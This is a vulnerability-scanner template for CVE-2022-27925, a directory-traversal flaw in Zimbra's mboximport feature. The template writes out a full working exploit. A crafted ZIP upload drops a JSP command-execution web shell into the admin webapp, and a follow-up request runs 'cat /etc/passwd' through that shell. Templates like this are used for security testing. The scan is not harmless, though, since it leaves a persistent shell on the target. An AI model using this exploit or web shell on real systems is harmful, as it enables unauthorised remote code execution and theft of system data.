id: CVE-2022-27925
info:
  name: Zimbra Unauthenticated Remote Code Execution
  author: akincibor
  severity: critical
  description: Zimbra Collaboration (aka ZCS) 8.8.15 and 9.0 has mboximport functionality that receives a ZIP archive and extracts files from it. An authenticated user with administrator rights has the ability to upload arbitrary files to the system, leading to directory traversal.
  reference:
    - https://github.com/mohamedbenchikh/CVE-2022-27925
  tags: cve,cve2022,zimbra,rce
requests:
  - raw:
      - |-
        POST /service/extension/backup/mboximport?account-name=admin&account-status=1&ow=cmd HTTP/2
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: keep-alive
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 4283

        PK\x03\x04\x14\x00\x00\x00\x00\x00\x06\x03\rU\x82\xb0*\xc7=\x03\x00\x00=\x03\x00\x000\x00\x00\x00../../../../mailboxd/webapps/zimbraAdmin/cmd.jsp<%@ page import="java.util.*,java.io.*"%>\n<%\n//\n// JSP_KIT\n//\n// cmd.jsp = Command Execution (unix)\n//\n// by: Unknown\n// modified: 27/06/2003\n//\n%>\n<HTML><BODY>\n<FORM METHOD="GET" NAME="myform" ACTION="">\n<INPUT TYPE="text" NAME="cmd">\n<INPUT TYPE="submit" VALUE="Send">\n</FORM>\n<pre>\n<%\nif (request.getParameter("cmd") != null) {\n        out.println("Command: " + request.getParameter("cmd") + "<BR>");\n        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));\n        OutputStream os = p.getOutputStream();\n        InputStream in = p.getInputStream();\n        DataInputStream dis = new DataInputStream(in);\n        String disr = dis.readLine();\n        while ( disr != null ) {\n                out.println(disr); \n                disr = dis.readLine(); \n                }\n        }\n%>\n</pre>\n</BODY></HTML>\n\n\nPK\x03\x04\x14\x00\x00\x00\x00\x00\x06\x03\rU\x82\xb0*\xc7=\x03\x00\x00=\x03\x00\x000\x00\x00\x00../../../../mailboxd/webapps/zimbraAdmin/cmd.jsp<%@ page import="java.util.*,java.io.*"%>\n<%\n//\n// JSP_KIT\n//\n// cmd.jsp = Command Execution (unix)\n//\n// by: Unknown\n// modified: 27/06/2003\n//\n%>\n<HTML><BODY>\n<FORM METHOD="GET" NAME="myform" ACTION="">\n<INPUT TYPE="text" NAME="cmd">\n<INPUT TYPE="submit" VALUE="Send">\n</FORM>\n<pre>\n<%\nif (request.getParameter("cmd") != null) {\n        out.println("Command: " + request.getParameter("cmd") + "<BR>");\n        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));\n        OutputStream os = p.getOutputStream();\n        InputStream in = p.getInputStream();\n        DataInputStream dis = new DataInputStream(in);\n        String disr = dis.readLine();\n        while ( disr != null ) {\n                out.println(disr); \n                disr = dis.readLine(); \n                }\n        }\n%>\n</pre>\n</BODY></HTML>\n\n\nPK\x03\x04\x14\x00\x00\x00\x08\x00\xb0\xab\x0eU\x1e\xa2\xee\xda\x05\x02\x00\x00\xd0\x03\x00\x00\x07\x00\x00\x00cmd.jspmR\xd1j\xdb0\x14\xfd\x15W\x90!\xd5\xae\xb6\x961\xc6\x1c\x99\xd1u\x85A\xa1\xa3]\x9e\xc6\x1ed\xfb\xc6\xd1\x90%M\x92c\x07\xe3\x7f\xaf\xecyI\x9a\xe5\xc9W\xe7\\_\xe9\x9cs\x97\x8b\xcf\x86W\x10\x89\xdah\xeb\x19\xfa\xcd\xb7\x9c\nM/\x93h*\x1b/\xe4\xbfCG\xbbZ\xd2\\\xa8rO+\xf0\xf4\x12-\xb2\xa5+\xac0>\x83-\x97\xb8\r\x1d\xba\xa5R\x17\\>{m\xc3|\nu\x0e%Y\xbe\x9d\xfb\x96\x8b\x0b\xd3\xe4R\x14\xd1\xb3\xb7BU\xd1\x16\xcfEK\xfa\xb9\xea\x18B\xa9\xb7\xbb\xbec\xab\xa7\x87;(t\t\x96\x96\xd3\x17\xb7\tZ\xfd\xb8\xbf\xfa\x88H:\x14\xdc\x17\x1b\xfc\xb5+\xc0x\xa1U\x04\xa4\x1f,\xf8\xc6\xaa\xa8K\x87\xf0\xb8\xc5<Q\'2)S\xcd$+\xc7\xd9w\xdc\xf3o\xca4>\xd0\xc0\xeb\xc82\x05mt\x82b\x0b\x7f\x1ap\x9eV\xe0\x8faB\xd2v#$`,\x99\xa5\x01*\x1f\x84\x82\x00_0\xd5HI\xfa2f2\x1d\xc4\x1a\x974\xf8\x01\xdd\xe3\x1a\xa3\x82!\x92\xb1w{\x89\x15\xdb\x06\xda5\xb9\x9b\xce\xf8&L\x9d)7I\xffnu\x01\xceE\x86=5\xca\x8b\x1a\xc6g\xcc%&\x14:(pE\xfeS"\xce*1g4\xe8\xc6S\x13.\xf4\x18-\x8d\x85\x0c\xede9&\xce\xc9\xd21s\x017\x92\x17\x10\xfeA\tz#}\x8a\xc8\x01\xcbF\xac\x1a\xb1\x18-s\x9b\xa1t8\x17\xd1\xe1f\x08\x19\x0e \x1d\xf4\x93[\x12T\xe57\x98d\xd7\xa4\x0ft\x94\xb3#\x07\xf3\xe0`:\xa2\xea\x18U#\x9a\xef<\xfc\xfc\x15\xd5l\xd4\xedw\x06\xbeh\xb5\x05\xeb\xc3\xd2\x18n\x1d\xdcr\x07\x1f\xde\xdf\n\xc5\xed\x0e\xbf\xf6=\x8f\x83\xf3{\xeb\xd7\xa7\xa9$\xea\xea\x9a\x90\xf8>\xf8B\x1d\x84a<lu\xfc\xbaI\xc57I>\xb6M\xb9=6\xfe\x90\x86\x9b>S$\xe3\x88c\x0e\xafI\xfa\x97\xa6\xad\x15\x1ep\x1d"ahe\xa4\xe6%\x94\x9f"\x14\xaf\xcf.\xf8\x89{\xd3\x963\xbd\xc8^\x00PK\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\x06\x03\rU\x82\xb0*\xc7=\x03\x00\x00=\x03\x00\x000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\x81\x00\x00\x00\x00../../../../mailboxd/webapps/zimbraAdmin/cmd.jspPK\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\x06\x03\rU\x82\xb0*\xc7=\x03\x00\x00=\x03\x00\x000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\x81\x8b\x03\x00\x00../../../../mailboxd/webapps/zimbraAdmin/cmd.jspPK\x01\x02\x14\x00\x14\x00\x00\x00\x08\x00\xb0\xab\x0eU\x1e\xa2\xee\xda\x05\x02\x00\x00\xd0\x03\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x01\x00 \x00\x00\x00\x16\x07\x00\x00cmd.jspPK\x05\x06\x00\x00\x00\x00\x03\x00\x03\x00\xf1\x00\x00\x00@\t\x00\x00\x00\x00
      - |+
        GET /zimbraAdmin/cmd.jsp?cmd=cat%20/etc/passwd HTTP/2
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: keep-alive
        Content-Type: application/x-www-form-urlencoded

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
